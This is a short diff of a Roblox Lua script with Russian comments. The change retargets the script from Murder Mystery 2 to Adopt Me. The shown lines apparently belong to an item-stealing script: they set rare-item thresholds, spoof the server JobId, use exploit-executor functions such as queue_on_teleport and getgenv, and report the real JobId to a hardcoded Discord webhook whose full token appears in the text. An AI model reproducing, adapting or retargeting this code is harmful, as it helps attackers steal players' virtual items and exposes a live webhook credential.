@@ -3,7 +3,7 @@ local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local placeId = 142823291 -- MM2 placeId
+local placeId = 126884695634066 -- Adopt Me placeId (или меняйте по нужде)
 local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
 local MinUnique, MinAncient, MinGodly = 1, 1, 1
 local spoofedJobId = game.JobId
@@ -75,7 +75,7 @@ TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportInfo)
         sendWebhook(realJobId)
 
         -- ---------------------------
-        -- Перезаходчик с queue_on_teleport
+        -- Перезаходчик
         queue_on_teleport(string.format([[getgenv().JobId = "%s"]], realJobId))
         for i = 1, 2 do
             task.spawn(function()
